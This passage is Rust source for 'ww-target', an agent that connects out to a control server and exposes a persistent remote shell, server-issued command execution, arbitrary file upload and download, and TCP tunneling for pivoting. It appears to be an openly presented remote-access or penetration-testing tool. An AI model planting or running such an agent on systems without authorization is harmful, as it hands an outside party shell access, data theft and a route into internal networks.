//! ww-target — smart agent for wirewrench.
//!
//! Connects to ww-server on the smart port (default 4446).
//! Uses a simple framed protocol: [type:u8][len:u32 LE][payload:len bytes].
//!
//! Frame types:
//!   0x01 SHELL      — shell stdin/stdout bytes
//!   0x02 HANDSHAKE  — initial identity exchange
//!   0x03 FILE_CTRL  — file transfer coordination (JSON)
//!   0x04 FILE_DATA  — raw file bytes (push)
//!   0x05 CANCEL     — abort file transfer
//!   0x06 HASH       — SHA-256 hash verification (JSON)
//!   0x07 KEEPALIVE  — heartbeat
//!   0x08 CMD        — per-command execution (JSON)
//!   0x09 CMD_RESULT — per-command result (JSON)
//!   0x0A..0x0E      — TCP tunneling frames

use core::time::Duration;
use std::collections::HashMap;
use std::io::{BufRead as _, BufReader, Read, Write};
use std::net::{IpAddr, Shutdown, TcpStream, ToSocketAddrs};
use std::process::{ChildStdin, Command, Stdio};
use std::sync::atomic::{AtomicBool, AtomicU64, AtomicUsize, Ordering};
use std::sync::mpsc::{RecvTimeoutError, SyncSender, TrySendError};
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::{Instant, SystemTime, UNIX_EPOCH};

use anyhow::{Context as _, Result};
use clap::Parser;

use sha2::Digest as _;
use wirewrench::target::protocol::{
    CmdRequest, CmdResult, FEATURE_TUNNEL, FRAME_CANCEL, FRAME_CMD, FRAME_CMD_RESULT,
    FRAME_FILE_CTRL, FRAME_FILE_DATA, FRAME_HANDSHAKE, FRAME_HASH, FRAME_KEEPALIVE, FRAME_SHELL,
    FRAME_TUNNEL_CLOSE, FRAME_TUNNEL_DATA, FRAME_TUNNEL_EOF, FRAME_TUNNEL_OPEN, FRAME_TUNNEL_OPENED,
    Handshake, MAX_FRAME_PAYLOAD, MAX_TUNNEL_DATA, PullMeta, PushDone, PushError, PushReady,
    PushVerified, TunnelClose, TunnelOpen, TunnelOpened, tunnel_data_payload, tunnel_stream_id,
};

#[derive(Parser)]
#[command(name = "ww-target", version, about = "wirewrench smart agent")]
struct Args {
    host: String,
    #[arg(short = 'p', long, default_value_t = wirewrench::DEFAULT_SMART_PORT)]
    port: u16,
    #[arg(short = 'P', long = "poll", default_value = "5.0")]
    poll_interval: f64,
    #[arg(short = 'n', long = "no-reconnect")]
    no_reconnect: bool,
    /// Override the shell used for interactive mode and command execution.
    /// Defaults to /bin/sh on Unix and %COMSPEC% (cmd.exe) on Windows.
    #[arg(long)]
    shell: Option<String>,
    /// Maximum number of simultaneous tunnel streams.
    #[arg(long, default_value_t = 64)]
    max_streams: usize,
    /// Seconds of tunnel inactivity before a stream is reaped.
    #[arg(long, default_value_t = 600)]
    idle_timeout: u64,
}

// ── Outbound writer (single writer thread) ─────────────────────────────────

/// One outbound frame: `(frame_type, payload)`.
type Outbound = (u8, Vec<u8>);

/// Depth of the inbound (socket → dispatcher) queue.  Bounded so a peer cannot
/// make the agent buffer frames without limit; a full queue blocks the reader
/// thread, which stops reading the socket and pushes back over TCP.
const INBOUND_QUEUE: usize = 256;

/// Spawn the single writer thread for a session.  Every producer sends frames
/// on the returned channel; no other code path may write to the socket.
fn spawn_writer(stream: TcpStream) -> std::io::Result<SyncSender<Outbound>> {
    let (tx, rx) = std::sync::mpsc::sync_channel::<Outbound>(1024);
    thread::spawn(move || {
        let mut w = stream;
        while let Ok((ftype, payload)) = rx.recv() {
            if write_frame(&mut w, ftype, &payload).is_err() {
                break;
            }
        }
        let _ = w.shutdown(Shutdown::Both);
    });
    Ok(tx)
}

/// Queue a frame for the writer thread.  Errors when the writer has died.
fn send(out: &SyncSender<Outbound>, ftype: u8, payload: Vec<u8>) -> Result<()> {
    out.send((ftype, payload))
        .map_err(|_| anyhow::anyhow!("writer thread died"))
}

fn send_json(out: &SyncSender<Outbound>, ftype: u8, value: &impl serde::Serialize) -> Result<()> {
    send(out, ftype, serde_json::to_vec(value)?)
}

// ── Shell selection ────────────────────────────────────────────────────────

/// The shell used for the persistent interactive session and for
/// single-command execution (FRAME_CMD).
#[derive(Clone)]
struct Shell {
    /// Program used for the persistent interactive shell.
    interactive_prog: String,
    /// Program + flag used to run a single command (`sh -c`, `cmd /C`, …).
    exec_prog: String,
    exec_flag: String,
}

impl Shell {
    fn spawn_interactive(&self) -> std::io::Result<std::process::Child> {
        Command::new(&self.interactive_prog)
            .stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .spawn()
    }

    fn spawn_cmd(&self, cmd: &str) -> std::io::Result<std::process::Child> {
        Command::new(&self.exec_prog)
            .arg(&self.exec_flag)
            .arg(cmd)
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .spawn()
    }
}

fn resolve_shell(explicit: Option<&str>) -> Shell {
    if let Some(prog) = explicit {
        let exec_flag = infer_exec_flag(prog);
        Shell {
            interactive_prog: prog.to_string(),
            exec_prog: prog.to_string(),
            exec_flag,
        }
    } else {
        default_shell()
    }
}

#[cfg(windows)]
fn default_shell() -> Shell {
    let comspec = std::env::var("COMSPEC").unwrap_or_else(|_| "cmd.exe".to_string());
    Shell {
        interactive_prog: comspec.clone(),
        exec_prog: comspec,
        exec_flag: "/C".into(),
    }
}

#[cfg(not(windows))]
fn default_shell() -> Shell {
    Shell {
        interactive_prog: "/bin/sh".to_string(),
        exec_prog: "/bin/sh".to_string(),
        exec_flag: "-c".into(),
    }
}

/// Guess the single-command flag for an explicitly provided shell program.
fn infer_exec_flag(prog: &str) -> String {
    let lower = prog.to_ascii_lowercase();
    if lower.contains("cmd") {
        "/C".into()
    } else if lower.contains("powershell") || lower.contains("pwsh") {
        "-Command".into()
    } else {
        "-c".into()
    }
}

/// Write bytes to the interactive shell's stdin, translating LF→CRLF on
/// Windows where cmd.exe expects carriage returns.
fn write_shell_input(stdin: &mut impl Write, payload: &[u8]) -> std::io::Result<()> {
    #[cfg(windows)]
    {
        let mut buf = Vec::with_capacity(payload.len() + 16);
        for &b in payload {
            if b == b'\n' && buf.last() != Some(&b'\r') {
                buf.push(b'\r');
            }
            buf.push(b);
        }
        stdin.write_all(&buf)?;
    }
    #[cfg(not(windows))]
    {
        stdin.write_all(payload)?;
    }
    stdin.flush()
}

/// Normalize CRLF→LF for command output on Windows so `ww send` results
/// match the Unix format.
#[cfg(windows)]
fn normalize_crlf(s: String) -> String {
    s.replace("\r\n", "\n")
}

#[cfg(not(windows))]
fn normalize_crlf(s: String) -> String {
    s
}

/// Resolve a best-effort hostname: HOSTNAME → COMPUTERNAME → `hostname` cmd.
fn detect_hostname() -> Option<String> {
    let from_env = std::env::var("HOSTNAME")
        .ok()
        .or_else(|| std::env::var("COMPUTERNAME").ok());
    if let Some(h) = from_env.filter(|s| !s.is_empty()) {
        return Some(h);
    }
    Command::new("hostname").output().ok().and_then(|out| {
        let s = String::from_utf8_lossy(&out.stdout).trim().to_string();
        (!s.is_empty()).then_some(s)
    })
}

// ── Frame I/O ───────────────────────────────────────────────────────────────

fn write_frame(w: &mut impl Write, frame_type: u8, payload: &[u8]) -> Result<()> {
    w.write_all(&[frame_type])?;
    w.write_all(&u32::try_from(payload.len())?.to_le_bytes())?;
    if !payload.is_empty() {
        w.write_all(payload)?;
    }
    w.flush()?;
    Ok(())
}

fn read_frame(r: &mut impl Read) -> Result<(u8, Vec<u8>)> {
    let mut header = [0_u8; 5];
    r.read_exact(&mut header)?;
    let frame_type = header[0];
    let len = u32::from_le_bytes(header[1..5].try_into().unwrap()) as usize;
    // Bound the allocation: `len` is peer-supplied.
    anyhow::ensure!(
        len <= MAX_FRAME_PAYLOAD,
        "frame payload of {len} bytes exceeds the {MAX_FRAME_PAYLOAD}-byte limit"
    );
    let mut payload = vec![0_u8; len];
    if len > 0 {
        r.read_exact(&mut payload)?;
    }
    Ok((frame_type, payload))
}

// ── Pipe forwarder ──────────────────────────────────────────────────────────

/// Spawn a thread that reads lines from `reader` and queues `FRAME_SHELL` packets.
fn spawn_pipe_to_frames<R>(reader: R, out: SyncSender<Outbound>)
where
    R: Read + Send + 'static,
{
    thread::spawn(move || {
        let mut reader = BufReader::new(reader);
        let mut buf = Vec::new();
        loop {
            buf.clear();
            match reader.read_until(b'\n', &mut buf) {
                Ok(0) | Err(_) => break,
                Ok(_) => {
                    if out.send((FRAME_SHELL, buf.clone())).is_err() {
                        break;
                    }
                }
            }
        }
    });
}

// ── Tunnel streams ──────────────────────────────────────────────────────────

fn now_ms() -> u64 {
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_millis() as u64)
        .unwrap_or(0)
}

/// Best-effort errno for a connect failure.  `TcpStream::connect_timeout`
/// synthesizes a `TimedOut` error with no OS errno, which would otherwise
/// degrade every timeout to SOCKS5 `0x01` on the client.
fn errno_of(e: &std::io::Error) -> Option<i32> {
    if let Some(n) = e.raw_os_error() {
        return Some(n);
    }
    match e.kind() {
        std::io::ErrorKind::TimedOut => Some(110),        // ETIMEDOUT / WSAETIMEDOUT
        std::io::ErrorKind::ConnectionRefused => Some(111),
        std::io::ErrorKind::PermissionDenied => Some(13),
        _ => None,
    }
}

/// Per-stream state shared between the main loop and the reader thread.
struct TunnelShared {
    last_activity: AtomicU64,
    closed_read: AtomicBool,
    closed_write: AtomicBool,
    closing: AtomicBool,
    remote_closed: AtomicBool,
    reason: Mutex<Option<String>>,
}

impl TunnelShared {
    fn new() -> Self {
        Self {
            last_activity: AtomicU64::new(now_ms()),
            closed_read: AtomicBool::new(false),
            closed_write: AtomicBool::new(false),
            closing: AtomicBool::new(false),
            remote_closed: AtomicBool::new(false),
            reason: Mutex::new(None),
        }
    }

    fn touch(&self) {
        self.last_activity.store(now_ms(), Ordering::Relaxed);
    }

    fn set_closing(&self, reason: &str) {
        let mut r = self.reason.lock().unwrap();
        if r.is_none() {
            *r = Some(reason.to_string());
        }
        drop(r);
        self.closing.store(true, Ordering::SeqCst);
    }

    fn reason(&self) -> String {
        self.reason
            .lock()
            .unwrap()
            .clone()
            .unwrap_or_else(|| "closed".to_string())
    }

    fn idle_for(&self) -> Duration {
        Duration::from_millis(now_ms().saturating_sub(self.last_activity.load(Ordering::Relaxed)))
    }

    fn should_close(&self) -> bool {
        self.closing.load(Ordering::SeqCst)
            || self.remote_closed.load(Ordering::SeqCst)
            || (self.closed_read.load(Ordering::SeqCst)
                && self.closed_write.load(Ordering::SeqCst))
    }
}

/// Commands processed by a tunnel stream's writer thread, which owns the write
/// half of the destination socket.  Writing from a dedicated thread keeps one
/// stalled destination from freezing the whole session: the dispatcher only
/// ever performs a non-blocking `try_send`.
enum TunnelCmd {
    Data(Vec<u8>),
    /// Half-close the destination (propagate the peer's EOF).
    ShutdownWrite,
    /// Discard queued data and close both directions.
    Close,
}

/// An established tunnel stream: the channel to its writer thread plus the
/// state shared with its reader thread.
struct TunnelHandle {
    tx: SyncSender<TunnelCmd>,
    shared: Arc<TunnelShared>,
}

/// Per-stream write queue depth (≈2 MiB of buffered tunnel data).  A stream
/// that exceeds it is reset rather than allowed to block the session: the link
/// is multiplexed, so per-stream TCP backpressure is not available.
const TUNNEL_WRITE_QUEUE: usize = 64;

/// Spawn the writer thread for one tunnel stream.  Dropping the returned
/// sender flushes the queue and then closes the socket; sending [`TunnelCmd::Close`]
/// discards the queue and closes immediately.
fn spawn_tunnel_writer(mut dest: TcpStream, shared: Arc<TunnelShared>) -> SyncSender<TunnelCmd> {
    let (tx, rx) = std::sync::mpsc::sync_channel::<TunnelCmd>(TUNNEL_WRITE_QUEUE);
    thread::spawn(move || {
        while let Ok(cmd) = rx.recv() {
            match cmd {
                TunnelCmd::Data(bytes) => {
                    if shared.closed_write.load(Ordering::SeqCst) {
                        continue;
                    }
                    match dest.write_all(&bytes) {
                        Ok(()) => shared.touch(),
                        Err(e)
                            if e.kind() == std::io::ErrorKind::WouldBlock
                                || e.kind() == std::io::ErrorKind::TimedOut =>
                        {
                            // A partially written payload cannot be resumed
                            // safely, so this stream is reset.
                            shared.set_closing("write timeout");
                            break;
                        }
                        Err(_) => {
                            shared.set_closing("write failed");
                            break;
                        }
                    }
                }
                TunnelCmd::ShutdownWrite => {
                    if !shared.closed_write.swap(true, Ordering::SeqCst) {
                        let _ = dest.shutdown(Shutdown::Write);
                        shared.touch();
                    }
                }
                TunnelCmd::Close => break,
            }
        }
        let _ = dest.shutdown(Shutdown::Both);
    });
    tx
}

// ── Transfer state machine (P1.3) ───────────────────────────────────────────

enum Transfer {
    Idle,
    Push {
        path: String,
        expected: String,
        remaining: usize,
        data: Vec<u8>,
    },
    Pull {
        data: Vec<u8>,
        sent: usize,
        hash: String,
    },
}

const PULL_CHUNK: usize = 8192;
const EMFILE_ERRNO: i32 = 24;
/// Per-session cap on concurrently executing `FRAME_CMD` threads.
const MAX_CONCURRENT_CMDS: usize = 8;
/// Per-stream cap on captured command output (stdout and stderr separately).
const MAX_CMD_OUTPUT: usize = 1024 * 1024;

// ── Session state ───────────────────────────────────────────────────────────

struct RunOpts {
    server_host: String,
    server_port: u16,
    server_ip: Option<IpAddr>,
    max_streams: usize,
    idle_timeout: Duration,
}

struct SessionState {
    out: SyncSender<Outbound>,
    shell_stdin: ChildStdin,
    shell: Arc<Shell>,
    transfer: Transfer,
    streams: HashMap<u32, TunnelHandle>,
    cmd_inflight: Arc<AtomicUsize>,
    opts: RunOpts,
}

impl SessionState {
    fn new(out: SyncSender<Outbound>, shell_stdin: ChildStdin, shell: Arc<Shell>, opts: RunOpts) -> Self {
        Self {
            out,
            shell_stdin,
            shell,
            transfer: Transfer::Idle,
            streams: HashMap::new(),
            cmd_inflight: Arc::new(AtomicUsize::new(0)),
            opts,
        }
    }

    /// Periodic work: pump an in-flight pull and reap finished/idle tunnels.
    fn tick(&mut self) -> Result<()> {
        while pull_pump(self)? {}
        self.reap_tunnels();
        Ok(())
    }

    fn reap_tunnels(&mut self) {
        let doomed: Vec<u32> = self
            .streams
            .iter()
            .filter(|(_, h)| h.shared.should_close())
            .map(|(id, _)| *id)
            .collect();
        for id in doomed {
            let Some(handle) = self.streams.remove(&id) else {
                continue;
            };
            // Dropping the sender makes the writer thread flush and then close
            // the destination socket.
            let TunnelHandle { tx, shared } = handle;
            drop(tx);
            if shared.remote_closed.load(Ordering::SeqCst) {
                continue;
            }
            let reason = shared.reason();
            let close = TunnelClose { stream_id: id, reason };
            if let Ok(json) = serde_json::to_vec(&close) {
                let _ = self.out.send((FRAME_TUNNEL_CLOSE, json));
            }
        }
    }

    /// Tear down every open tunnel on session end.  Closing the destination
    /// sockets unblocks both per-stream threads, so nothing is left holding a
    /// fd or a clone of the outbound channel.
    fn shutdown_streams(&mut self) {
        for (_, handle) in self.streams.drain() {
            handle.shared.set_closing("session ended");
            let _ = handle.tx.try_send(TunnelCmd::Close);
        }
    }

    /// Best-effort check that a requested destination is not our own server.
    /// Compares the literal host, and every address the target would dial
    /// against the address of the control connection.
    fn is_own_server(&self, host: &str, port: u16) -> bool {
        if port != self.opts.server_port {
            return false;
        }
        if host.eq_ignore_ascii_case(&self.opts.server_host) {
            return true;
        }
        if let (Ok(ip), Some(peer)) = (host.parse::<IpAddr>(), self.opts.server_ip) {
            return ip == peer;
        }
        false
    }

    /// Whether dialling `addr` would reach the agent's own server.
    fn addr_is_own_server(&self, addr: &std::net::SocketAddr, port: u16) -> bool {
        port == self.opts.server_port && Some(addr.ip()) == self.opts.server_ip
    }
}

// ── Session ─────────────────────────────────────────────────────────────────

fn run_session(stream: TcpStream, shell: Arc<Shell>, opts: RunOpts) -> Result<()> {
    stream.set_read_timeout(None)?;
    let mut reader = stream.try_clone()?;
    let out = spawn_writer(stream)?;

    // ── Handshake ────────────────────────────────────────────────
    let hostname = detect_hostname();
    let platform = Some(format!("{}/{}", std::env::consts::OS, std::env::consts::ARCH));
    let mut features = Vec::new();
    // Test-only escape hatch: pretend we cannot tunnel (e2e case 18).
    if std::env::var_os("WW_NO_TUNNEL").is_none() {
        features.push(FEATURE_TUNNEL.to_string());
    }
    send_json(
        &out,
        FRAME_HANDSHAKE,
        &Handshake::new_client(hostname, platform, features),
    )?;

    let (ftype, payload) = read_frame(&mut reader)?;
    anyhow::ensure!(ftype == FRAME_HANDSHAKE, "Expected handshake, got frame type {ftype}");
    let resp: Handshake = serde_json::from_slice(&payload).context("Invalid handshake response")?;
    eprintln!(
        "[+] Connected. Session ID: {}",
        resp.session_id.as_deref().unwrap_or("?")
    );

    // ── Spawn persistent shell ───────────────────────────────────
    let mut child = shell
        .spawn_interactive()
        .context("Failed to spawn interactive shell")?;

    let child_stdin = child.stdin.take().unwrap();
    let child_stdout = child.stdout.take().unwrap();
    let child_stderr = child.stderr.take().unwrap();

    // Threads: read shell stdout/stderr → send SHELL frames
    spawn_pipe_to_frames(child_stdout, out.clone());
    spawn_pipe_to_frames(child_stderr, out.clone());

    // ── Reader thread: socket → bounded channel (backpressure) ───
    let (frame_tx, frame_rx) = std::sync::mpsc::sync_channel::<(u8, Vec<u8>)>(INBOUND_QUEUE);
    thread::spawn(move || {
        let mut r = reader;
        while let Ok(frame) = read_frame(&mut r) {
            if frame_tx.send(frame).is_err() {
                break;
            }
        }
    });

    let mut st = SessionState::new(out, child_stdin, shell, opts);
    loop {
        match frame_rx.recv_timeout(Duration::from_millis(50)) {
            Ok((ftype, payload)) => {
                if let Err(e) = dispatch(&mut st, ftype, payload) {
                    eprintln!("[-] Session error: {e}");
                    break;
                }
                if st.tick().is_err() {
                    break;
                }
            }
            Err(RecvTimeoutError::Timeout) => {
                if st.tick().is_err() {
                    break;
                }
            }
            Err(RecvTimeoutError::Disconnected) => {
                eprintln!("[-] Connection closed");
                break;
            }
        }
    }

    // Clean up: close every tunnel before the session goes away.
    let _ = st.shell_stdin.flush();
    st.shutdown_streams();
    let _ = child.kill();
    let _ = child.wait();
    Ok(())
}

// ── Dispatch ────────────────────────────────────────────────────────────────

fn dispatch(st: &mut SessionState, ftype: u8, payload: Vec<u8>) -> Result<()> {
    match ftype {
        FRAME_SHELL => {
            write_shell_input(&mut st.shell_stdin, &payload)?;
            Ok(())
        }
        FRAME_FILE_CTRL => handle_file_ctrl(st, &payload),
        FRAME_FILE_DATA | FRAME_HASH | FRAME_CANCEL => push_frame(st, ftype, &payload),
        FRAME_CMD => handle_cmd(st, &payload),
        FRAME_KEEPALIVE => Ok(()),
        FRAME_TUNNEL_OPEN => {
            let open: TunnelOpen = match serde_json::from_slice(&payload) {
                Ok(o) => o,
                Err(e) => {
                    eprintln!("[-] Invalid TUNNEL_OPEN: {e}");
                    return Ok(());
                }
            };
            tunnel_open(st, open)
        }
        FRAME_TUNNEL_DATA => {
            if let Some(id) = tunnel_stream_id(&payload) {
                tunnel_write(st, id, &payload[4..]);
            }
            Ok(())
        }
        FRAME_TUNNEL_EOF => {
            if let Some(id) = tunnel_stream_id(&payload) {
                tunnel_shutdown_write(st, id);
            }
            Ok(())
        }
        FRAME_TUNNEL_CLOSE => {
            if let Ok(close) = serde_json::from_slice::<TunnelClose>(&payload) {
                tunnel_remote_close(st, close.stream_id);
            }
            Ok(())
        }
        FRAME_TUNNEL_OPENED => Ok(()), // target never receives this
        _ => {
            eprintln!("[-] Unknown frame type: {ftype}");
            Ok(())
        }
    }
}

// ── File transfer dispatch ──────────────────────────────────────────────────

fn handle_file_ctrl(st: &mut SessionState, payload: &[u8]) -> Result<()> {
    let msg: serde_json::Value = match serde_json::from_slice(payload) {
        Ok(v) => v,
        Err(e) => {
            eprintln!("[-] Invalid FILE_CTRL JSON: {e}");
            return Ok(());
        }
    };
    match msg["type"].as_str().unwrap_or("") {
        "push_start" => {
            let path = msg["path"].as_str().unwrap_or("").to_owned();
            let size = msg["size"].as_u64().unwrap_or(0);
            let expected = msg["hash"].as_str().unwrap_or("").to_owned();
            start_push(st, path, size, expected)
        }
        "pull" => {
            let path = msg["path"].as_str().unwrap_or("").to_owned();
            start_pull(st, path)
        }
        _ => Ok(()),
    }
}

fn start_push(st: &mut SessionState, path: String, size: u64, expected: String) -> Result<()> {
    send_json(&st.out, FRAME_HASH, &PushReady::new(path.clone()))?;
    st.transfer = Transfer::Push {
        path,
        expected,
        remaining: size as usize,
        data: Vec::with_capacity(size.min(64 * 1024 * 1024) as usize),
    };
    Ok(())
}

fn push_frame(st: &mut SessionState, ftype: u8, payload: &[u8]) -> Result<()> {
    match &mut st.transfer {
        Transfer::Push { remaining, data, .. } => match ftype {
            FRAME_FILE_DATA => {
                if *remaining == 0 {
                    return Ok(());
                }
                let take = payload.len().min(*remaining);
                data.extend_from_slice(&payload[..take]);
                *remaining -= take;
                if *remaining == 0 {
                    finalize_push(st)?;
                }
                Ok(())
            }
            FRAME_HASH => {
                let msg: serde_json::Value = match serde_json::from_slice(payload) {
                    Ok(v) => v,
                    Err(e) => {
                        eprintln!("[-] Invalid HASH JSON: {e}");
                        return Ok(());
                    }
                };
                if msg["type"] == "push_done" {
                    if *remaining == 0 {
                        finalize_push(st)?;
                    } else {
                        let path = push_path(st);
                        let _ = send_json(
                            &st.out,
                            FRAME_FILE_CTRL,
                            &PushError::new(path, "Incomplete push".into()),
                        );
                        st.transfer = Transfer::Idle;
                    }
                }
                Ok(())
            }
            FRAME_CANCEL => {
                let path = push_path(st);
                let _ = send_json(
                    &st.out,
                    FRAME_FILE_CTRL,
                    &PushError::new(path, "Cancelled by server".into()),
                );
                st.transfer = Transfer::Idle;
                Ok(())
            }
            _ => Ok(()),
        },
        Transfer::Pull { .. } if ftype == FRAME_CANCEL => {
            st.transfer = Transfer::Idle;
            Ok(())
        }
        // Stale frames from a previous transfer: ignore.
        _ => Ok(()),
    }
}

fn push_path(st: &SessionState) -> String {
    match &st.transfer {
        Transfer::Push { path, .. } => path.clone(),
        _ => String::new(),
    }
}

fn finalize_push(st: &mut SessionState) -> Result<()> {
    let (path, expected, remaining, data) = match std::mem::replace(&mut st.transfer, Transfer::Idle) {
        Transfer::Push { path, expected, remaining, data } => (path, expected, remaining, data),
        other => {
            st.transfer = other;
            return Ok(());
        }
    };
    if remaining > 0 {
        let _ = send_json(
            &st.out,
            FRAME_FILE_CTRL,
            &PushError::new(path, format!("Incomplete push: {remaining} bytes missing")),
        );
        return Ok(());
    }

    let mut h = sha2::Sha256::new();
    h.update(&data);
    let actual = format!("{:x}", h.finalize());

    if actual != expected {
        let _ = send_json(
            &st.out,
            FRAME_FILE_CTRL,
            &PushError::new(
                path,
                format!("Hash mismatch: expected {expected}, got {actual}"),
            ),
        );
        return Ok(());
    }

    if let Some(p) = std::path::Path::new(&path).parent() {
        let _ = std::fs::create_dir_all(p);
    }
    if let Err(e) = std::fs::write(&path, &data) {
        let _ = send_json(
            &st.out,
            FRAME_FILE_CTRL,
            &PushError::new(path, format!("Write error: {e}")),
        );
        return Ok(());
    }

    send_json(&st.out, FRAME_HASH, &PushVerified::new(actual))?;
    eprintln!("[+] Received '{path}' ({expected})");
    Ok(())
}

fn start_pull(st: &mut SessionState, path: String) -> Result<()> {
    let data = match std::fs::read(&path) {
        Ok(d) => d,
        Err(e) => {
            let _ = send_json(
                &st.out,
                FRAME_FILE_CTRL,
                &PushError::new(path, format!("Read error: {e}")),
            );
            return Ok(());
        }
    };
    let size = data.len() as u64;
    let mut h = sha2::Sha256::new();
    h.update(&data);
    let hash = format!("{:x}", h.finalize());

    send_json(
        &st.out,
        FRAME_FILE_CTRL,
        &PullMeta::new(path.clone(), size, hash.clone()),
    )?;
    st.transfer = Transfer::Pull { data, sent: 0, hash };
    eprintln!("[+] Sending '{path}' ({size} bytes)");
    Ok(())
}

/// Send one `FRAME_FILE_DATA` chunk (or the closing `PushDone`).  Returns
/// `false` when the outbound queue is full and the caller should retry later.
fn pull_pump(st: &mut SessionState) -> Result<bool> {
    enum Act {
        Chunk(Vec<u8>, usize),
        Done(Vec<u8>),
    }
    let act = match &mut st.transfer {
        Transfer::Pull { data, sent, hash } => {
            if *sent >= data.len() {
                Act::Done(serde_json::to_vec(&PushDone::new(hash.clone()))?)
            } else {
                let end = (*sent + PULL_CHUNK).min(data.len());
                Act::Chunk(data[*sent..end].to_vec(), end)
            }
        }
        _ => return Ok(false),
    };
    match act {
        Act::Chunk(chunk, end) => match st.out.try_send((FRAME_FILE_DATA, chunk)) {
            Ok(()) => {
                if let Transfer::Pull { sent, .. } = &mut st.transfer {
                    *sent = end;
                }
                Ok(true)
            }
            Err(TrySendError::Full(_)) => Ok(false),
            Err(TrySendError::Disconnected(_)) => anyhow::bail!("writer thread died"),
        },
        Act::Done(json) => {
            st.transfer = Transfer::Idle;
            send(&st.out, FRAME_HASH, json)?;
            Ok(true)
        }
    }
}

// ── Command execution ───────────────────────────────────────────────────────

/// Releases one slot of the per-session command limit when dropped.
struct CmdSlot(Arc<AtomicUsize>);

impl Drop for CmdSlot {
    fn drop(&mut self) {
        self.0.fetch_sub(1, Ordering::SeqCst);
    }
}

fn handle_cmd(st: &mut SessionState, payload: &[u8]) -> Result<()> {
    let req: CmdRequest = match serde_json::from_slice(payload) {
        Ok(r) => r,
        Err(e) => {
            eprintln!("[-] Invalid CMD request: {e}");
            return Ok(());
        }
    };
    // Bound concurrency: each command costs a thread and a process.
    if st.cmd_inflight.load(Ordering::SeqCst) >= MAX_CONCURRENT_CMDS {
        let result = CmdResult {
            seq: req.seq,
            exit_code: -1,
            stdout: String::new(),
            stderr: format!(
                "refusing to run: {MAX_CONCURRENT_CMDS} commands are already in flight"
            ),
        };
        return send_json(&st.out, FRAME_CMD_RESULT, &result);
    }
    st.cmd_inflight.fetch_add(1, Ordering::SeqCst);

    // Run in a thread so long-running commands don't stall tunnel traffic.
    let slot = CmdSlot(Arc::clone(&st.cmd_inflight));
    let out = st.out.clone();
    let shell = Arc::clone(&st.shell);
    thread::spawn(move || {
        let _slot = slot;
        let result = run_cmd(&shell, &req);
        let _ = send_json(&out, FRAME_CMD_RESULT, &result);
    });
    Ok(())
}

/// Run one `FRAME_CMD` with capped stdout/stderr capture.
fn run_cmd(shell: &Shell, req: &CmdRequest) -> CmdResult {
    let mut child = match shell.spawn_cmd(&req.cmd) {
        Ok(c) => c,
        Err(e) => {
            return CmdResult {
                seq: req.seq,
                exit_code: -1,
                stdout: String::new(),
                stderr: format!("Failed to spawn command shell: {e}"),
            };
        }
    };

    // Drain both pipes concurrently — a full pipe would block the child — but
    // keep at most `MAX_CMD_OUTPUT` bytes per stream.
    let out_reader = child
        .stdout
        .take()
        .map(|s| thread::spawn(move || read_capped(s, MAX_CMD_OUTPUT)));
    let err_reader = child
        .stderr
        .take()
        .map(|s| thread::spawn(move || read_capped(s, MAX_CMD_OUTPUT)));
    let status = child.wait();
    let (stdout, out_truncated) = out_reader
        .map(|h| h.join().unwrap_or((Vec::new(), true)))
        .unwrap_or((Vec::new(), false));
    let (stderr, err_truncated) = err_reader
        .map(|h| h.join().unwrap_or((Vec::new(), true)))
        .unwrap_or((Vec::new(), false));

    let mut stdout = normalize_crlf(String::from_utf8_lossy(&stdout).into_owned());
    let mut stderr = normalize_crlf(String::from_utf8_lossy(&stderr).into_owned());
    if out_truncated {
        stdout.push_str("\n[output truncated]");
    }
    if err_truncated {
        stderr.push_str("\n[output truncated]");
    }

    CmdResult {
        seq: req.seq,
        exit_code: status.ok().and_then(|s| s.code()).unwrap_or(-1),
        stdout,
        stderr,
    }
}

/// Read the whole stream, keeping at most `cap` bytes.  The stream is always
/// drained to EOF so the writer (often a child process) never blocks, and the
/// second element reports whether anything was dropped.
fn read_capped<R: Read>(mut r: R, cap: usize) -> (Vec<u8>, bool) {
    let mut out = Vec::new();
    let mut truncated = false;
    let mut buf = [0_u8; 8192];
    loop {
        match r.read(&mut buf) {
            Ok(0) | Err(_) => return (out, truncated),
            Ok(n) => {
                let room = cap.saturating_sub(out.len());
                if room == 0 {
                    truncated = true;
                } else if n <= room {
                    out.extend_from_slice(&buf[..n]);
                } else {
                    out.extend_from_slice(&buf[..room]);
                    truncated = true;
                }
            }
        }
    }
}

// ── Tunnel handling ─────────────────────────────────────────────────────────

fn tunnel_open(st: &mut SessionState, open: TunnelOpen) -> Result<()> {
    let stream_id = open.stream_id;
    let fail = |st: &SessionState, errno: Option<i32>, message: &str| -> Result<()> {
        send_json(
            &st.out,
            FRAME_TUNNEL_OPENED,
            &TunnelOpened {
                stream_id,
                ok: false,
                bound: None,
                errno,
                message: Some(message.to_string()),
            },
        )
    };

    if st.streams.len() >= st.opts.max_streams {
        return fail(st, Some(EMFILE_ERRNO), "too many tunnel streams");
    }
    if st.is_own_server(&open.host, open.port) {
        return fail(st, None, "refusing to dial own server");
    }

    let budget = Duration::from_secs_f64(open.connect_timeout.clamp(0.05, 3600.0));
    let deadline = Instant::now() + budget;
    let addrs = match (open.host.as_str(), open.port).to_socket_addrs() {
        Ok(a) => a,
        Err(e) => {
            return fail(
                st,
                errno_of(&e),
                &format!("cannot resolve '{}': {e}", open.host),
            );
        }
    };

    let mut last_err: Option<std::io::Error> = None;
    let mut dest: Option<TcpStream> = None;
    let mut skipped_own_server = false;
    for addr in addrs {
        // The resolved-address check catches aliases and `localhost` that the
        // literal host comparison above misses.
        if st.addr_is_own_server(&addr, open.port) {
            skipped_own_server = true;
            continue;
        }
        let remaining = deadline.saturating_duration_since(Instant::now());
        if remaining.is_zero() {
            break;
        }
        match TcpStream::connect_timeout(&addr, remaining) {
            Ok(s) => {
                dest = Some(s);
                break;
            }
            Err(e) => last_err = Some(e),
        }
    }

    if dest.is_none() {
        if skipped_own_server && last_err.is_none() {
            return fail(st, None, "refusing to dial own server");
        }
        let e = last_err.unwrap_or_else(|| {
            std::io::Error::new(std::io::ErrorKind::TimedOut, "connect timeout")
        });
        return fail(
            st,
            errno_of(&e),
            &format!("connect to {}:{} failed: {e}", open.host, open.port),
        );
    }

    let dest = dest.unwrap();
    let _ = dest.set_nodelay(true);
